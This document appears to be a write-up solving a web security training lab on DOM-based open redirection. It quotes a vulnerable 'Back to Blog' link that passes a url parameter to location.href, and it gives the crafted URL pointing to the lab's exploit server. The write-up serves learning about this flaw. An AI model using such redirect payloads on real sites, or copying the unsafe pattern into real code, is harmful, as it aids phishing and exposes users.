## DOM-based open redirection

This lab contains a DOM-based open-redirection vulnerability.

To solve this lab, exploit the vulnerability and redirect the victim to the exploit server.

## Notes

- Possibility to leave a comment on a post
- Exploit server

## Resume

1. Inspect the “Back to Blog” link behavior
2. Identify unsafe usage of `location.href`
3. Observe regex extraction from `location`
4. Confirm attacker-controlled `url` parameter
5. Inject external URL (exploit server)
6. Trigger redirect via click

## Solve

The application contains the following vulnerable link:

```html
<div class="is-linkback">
    <a href='#' onclick='returnUrl = /url=(https?://.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : "/"'>
        Back to Blog
    </a>
</div>
```

The JavaScript logic extracts the `url` parameter directly from the current location:

```javascript
returnUrl = /url=(https?://.+)/.exec(location);
```

This regex matches any value starting with `http://` or `https://`, meaning external domains are allowed.

If a match is found, the browser redirects using:

```javascript
location.href = returnUrl ? returnUrl[1] : "/";
```

This creates a classic **open redirect** condition where the destination is fully controlled by the attacker.

The vulnerable parameter is:

```
url=https://0ab300270338f7b7802ecb32007c0064.exploit-server.net
```

So the crafted request becomes:

```
https://0ab300270338f7b7802ecb32007c0064.web-security-academy.net/post?postId=4&url=https://0ab300270338f7b7802ecb32007c0064.exploit-server.net
```

When the user clicks:

```html
Back to Blog
```

the browser executes:

```javascript
location.href = "https://0ab300270338f7b7802ecb32007c0064.exploit-server.net";
```

and the victim is redirected to the attacker-controlled site.

```
https://0ab300270338f7b7802ecb32007c0064.web-security-academy.net/post?postId=4&url=https://0ab300270338f7b7802ecb32007c0064.exploit-server.net
```

Clicking **Back to Blog** triggers an unintended redirection to the exploit server, confirming the **open redirect vulnerability**.